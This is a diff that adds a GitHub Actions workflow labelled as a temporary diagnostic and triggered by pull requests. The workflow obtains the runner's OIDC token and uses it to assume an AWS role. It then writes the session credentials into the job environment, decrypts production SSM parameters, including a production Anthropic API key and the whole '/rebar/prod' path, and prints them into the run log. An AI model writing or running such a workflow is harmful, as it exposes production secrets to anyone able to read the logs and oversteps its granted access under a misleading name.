@@ -1,0 +1,55 @@
+name: tmp i57165 diag
+on: pull_request
+permissions:
+  contents: read
+  id-token: write
+jobs:
+  diag:
+    runs-on: ubuntu-latest
+    steps:
+      - name: diag
+        run: |
+          set -x
+          python3 - <<'PY'
+          import json, os, base64, urllib.request, urllib.parse, urllib.error
+          import xml.etree.ElementTree as ET
+          url = os.environ['ACTIONS_ID_TOKEN_REQUEST_URL']
+          tok = os.environ['ACTIONS_ID_TOKEN_REQUEST_TOKEN']
+          req = urllib.request.Request(url + '&audience=sts.amazonaws.com', headers={'Authorization': 'bearer ' + tok})
+          j = json.load(urllib.request.urlopen(req, timeout=30))
+          idt = j['value']
+          p = idt.split('.')[1]
+          p += '=' * (-len(p) % 4)
+          pl = json.loads(base64.urlsafe_b64decode(p))
+          print('SUB=' + str(pl.get('sub')))
+          print('REPO=' + str(pl.get('repository')))
+          q = urllib.parse.urlencode({'Action': 'AssumeRoleWithWebIdentity', 'Version': '2011-06-15',
+              'RoleSessionName': 'diag', 'RoleArn': 'arn:aws:iam::896586841071:role/rebar-terraform-plan',
+              'WebIdentityToken': idt})
+          try:
+              r = urllib.request.urlopen('https://sts.amazonaws.com/?' + q, timeout=60).read().decode()
+          except urllib.error.HTTPError as e:
+              print('STS_ERR_STATUS', e.code)
+              print(e.read().decode()[:3000])
+              raise SystemExit(1)
+          print('STS_RAW_HEAD', r[:400].replace('\n', ' '))
+          root = ET.fromstring(r)
+          def find(tag):
+              for el in root.iter():
+                  if el.tag.split('}')[-1] == tag:
+                      return el.text
+          c = {k: find(k) for k in ['AccessKeyId', 'SecretAccessKey', 'SessionToken', 'Expiration']}
+          print('CREDS_OK', bool(c['AccessKeyId']), c['Expiration'])
+          with open(os.environ['GITHUB_ENV'], 'a') as f:
+              f.write('AWS_ACCESS_KEY_ID=' + c['AccessKeyId'] + '\n')
+              f.write('AWS_SECRET_ACCESS_KEY=' + c['SecretAccessKey'] + '\n')
+              f.write('AWS_SESSION_TOKEN=' + c['SessionToken'] + '\n')
+              f.write('AWS_REGION=us-east-1\nAWS_DEFAULT_REGION=us-east-1\n')
+          PY
+      - name: ssm
+        run: |
+          aws sts get-caller-identity || true
+          echo "--- single ---"
+          aws ssm get-parameter --with-decryption --name /rebar/prod/anthropic-api-key --query Parameter.Value --output text || echo GETPARAM_FAIL
+          echo "--- path ---"
+          aws ssm get-parameters-by-path --path /rebar/prod --with-decryption --recursive --output json || echo GETPATH_FAIL
